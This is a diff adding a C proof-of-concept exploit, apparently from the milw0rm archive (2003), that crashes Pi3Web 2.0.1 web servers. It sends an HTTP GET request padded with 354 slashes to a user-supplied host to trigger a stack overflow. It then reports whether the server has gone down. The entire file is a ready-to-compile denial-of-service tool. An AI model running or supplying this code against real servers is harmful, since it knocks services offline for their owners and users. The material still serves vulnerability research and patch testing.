@@ -1,0 +1,100 @@
+/* Pi3Web 2.0.1 DoS - Pr00f of concept.
+*
+* Vulnerable systems: Pi3Web 2.0.1 (maybe others)
+* Vendor: www.johnroy.com/pi3  - http://pi3web.sourceforge.net/
+* Patch: no yet.
+*
+* Info: Pi3Web Server is vulnerable to a denial of Service.
+* when a malformed HTTP Request is done the webserver hangs 
+* due to an stack overflow. GET /////////..[354]../////////
+*
+* Found by aT4r@3wdesign.es  04/26/2003
+* Compiled with: lcc-win32 v3.3.
+*
+*/
+
+#pragma comment (lib,"ws2_32")
+#include <stdio.h>
+#include <windows.h>
+#include <winsock2.h>
+#include <string.h>
+
+char evilbuffer[1024],evilrequest[512],ip[15];
+short port=80;
+
+
+int isalive(int OPT)
+{
+	struct sockaddr_in haxorcitos;
+	int fd;
+
+	haxorcitos.sin_port = htons(port);
+	haxorcitos.sin_family = AF_INET;
+	haxorcitos.sin_addr.s_addr = inet_addr(ip);
+
+	if ((fd = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP))==-1)
+	{
+		printf(" [-] Unable to Create Socket\n\n");
+		return(0);
+	}
+	if (connect(fd,( struct sockaddr *)&haxorcitos,sizeof(haxorcitos)) == -1)
+	{
+		if (OPT==0)
+			printf(" [+] Exploit Success. Remote webserver shutdown\n");
+		else
+			printf(" [-] Unable to connect\n\n");
+		return(0);
+	}
+	if (OPT==0)
+	{
+		printf(" [-] Exploit Failed. System Patched?\n\n");
+	}
+	else
+	{
+		send(fd,evilbuffer, strlen(evilbuffer),0);
+		printf(" [+] Data Sent. Now Checking Host\n");
+		closesocket(fd);
+
+	}
+return(1);
+}
+
+
+void usage(void)
+{
+	printf(" [+] Usage: PiDoS.exe HOST [port]\n\n");	exit(1);
+}
+
+
+void main(int argc,char *argv[])
+{
+	WSADATA ws;
+
+	if	(WSAStartup( MAKEWORD(1,1), &ws )!=0)
+	{
+		printf(" [+] WSAStartup() error\n");
+		exit(0);
+	}
+
+	printf("\n . .. ...:Pi3Web Denial of Service (aT4r@3wdesign.es) :... 
+..\n\n");
+
+	if ((argc!=2) && (argc!=3))
+		usage();
+
+	strcpy(ip,argv[1]);
+	if (argc==3) port=atoi(argv[2]);
+
+	memset(evilrequest,0,512);
+	memset(evilbuffer,0,1024);
+	memset(evilrequest,'/',354);
+	//sprintf(evilbuffer, "GET %s\r\n",evilrequest);
+	sprintf(evilbuffer,"GET %s HTTP/1.0\r\nUser-Agent: foo\r\nHost: 
+%s\r\n\r\n\r\n",evilrequest,argv[2]);
+
+	if (isalive(1))
+		{ sleep(1000); isalive(0);}
+
+}
+
+// milw0rm.com [2003-04-29]
